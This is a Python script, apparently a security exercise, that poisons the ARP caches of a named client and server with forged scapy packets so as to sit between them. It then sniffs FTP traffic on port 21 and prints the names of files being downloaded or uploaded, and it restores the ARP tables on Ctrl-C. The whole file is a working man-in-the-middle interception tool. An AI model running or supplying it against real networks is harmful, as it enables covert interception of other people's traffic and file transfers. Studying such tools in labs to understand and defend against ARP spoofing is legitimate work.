import scapy.all as scapy
from functools import partial
import signal
import threading
import time
import re
import argparse

def exit_gracefully(signum, frame, arguments, thread, event):
    print("Wow you want to quit!")

    event.set()
    thread.join()

    packet_source = scapy.ARP(pdst=arguments.ipTarget, hwdst=arguments.macTarget, psrc=arguments.ipSource, hwsrc=arguments.macSource, op="is-at")
    packet_target = scapy.ARP(pdst=arguments.ipSource, hwdst=arguments.macSource, psrc=arguments.ipTarget, hwsrc=arguments.macTarget, op="is-at")

    send_packet(arguments.macTarget, packet_source)
    send_packet(arguments.macSource, packet_target)

    print(f" --- ARP Table restored at {arguments.ipTarget} --- ", flush=True)
    print(f" --- ARP Table restored at {arguments.ipSource} --- ", flush=True)


    exit(0)

def send_packet(destination, packet):
    scapy.sendp(scapy.Ether(dst=destination)/packet, verbose=False)

def packet_processing(packet):
    
    if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
        ipheader = packet[scapy.IP].load
        data = packet[scapy.Raw].load
        print(ipheader)
        if b"RETR" in data:
            print(f"Downloading: {data.decode()[5:-2]}", flush=True)
        elif b"STOR" in data:
            print(f"Uploading: {data.decode()[5:-2]}", flush=True)
    


def inject(ip_target, mac_target, ip_src):
    packet = scapy.ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_src, op="is-at")
    send_packet(mac_target, packet)
    print(f" --- ARP Table spoofed at {ip_target} --- ", flush=True)


def validate_ips(ips: list):
    for ip in ips:
        digits = ip.split('.') # split on the dots (10.10.10.10)
        if len(digits) != 4:
            raise ValueError("Invalid IP address: invalid structure")
        
        for number in digits:
            if not number.isdigit():
                raise ValueError("Invalid IP address: is not a digit")
            digit = int(number)
            if digit < 0 or digit > 255:
                raise ValueError("Invalid IP address: exceeded digit range")

def validate_macs(macs: list):
    for mac in macs:
        if re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac) is None:
            raise ValueError("Invalid MAC address")

def spoof(ip_target, mac_target, ip_source, mac_source, stop_event):
    while not stop_event.is_set():
        inject(ip_target, mac_target, ip_source)
        inject(ip_source, mac_source, ip_target)
        stop_event.wait(10)

def main(args):
    try:
        validate_ips((args.ipSource, args.ipTarget))
        validate_macs((args.macSource, args.macTarget))

        stop_event = threading.Event()
        thread = threading.Thread(target=spoof, args=(args.ipTarget, args.macTarget, args.ipSource, args.macSource, stop_event))
        thread.start()

        handler = partial(exit_gracefully, arguments=args, thread=thread, event=stop_event)
        signal.signal(signal.SIGINT, handler)

        scapy.sniff(filter="tcp port 21", prn=packet_processing, store=0)

    except Exception as e:
        print(f"Error: {e}")
        exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("ipSource", type=str, help="IP-src: The IP of the client")
    parser.add_argument("macSource", type=str, help="MAC-src: The MAC of the client")
    parser.add_argument("ipTarget", type=str, help="IP-target: The IP of the server")
    parser.add_argument("macTarget", type=str, help="MAC-target: The MAC of the server")

    args = parser.parse_args()
    main(args)